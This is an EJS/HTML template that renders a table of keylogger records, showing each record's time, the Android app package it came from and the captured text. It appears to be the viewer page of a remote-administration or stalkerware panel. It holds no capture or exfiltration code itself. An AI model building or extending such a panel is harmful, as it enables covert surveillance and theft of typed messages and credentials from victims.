<div class="ui segment">
    <table class="ui celled table">
        <thead>
            <tr>
                <th>Time</th>
                <th>Package</th>
                <th>Content</th>
            </tr>
        </thead>
        <tbody>
            <% pageData.forEach((keyLogger) => { 
                let date = new Date(parseInt(keyLogger.eventTime));
            %>
            <tr>
                <td class="collapsing"><%= date.toLocaleString('en-US', {timeZone: 'Asia/Phnom_Penh'}) %></td>
                <td class="collapsing" title="<%= keyLogger.appName %>"><a
                        href="?filter=<%= keyLogger.appName %>"><%= keyLogger.appName.substring(0,35) %></a>
                </td>
                <td>
                    <%= keyLogger.content %>
                </td>
            </tr>
            <% }) %>
        </tbody>
    </table>
</div>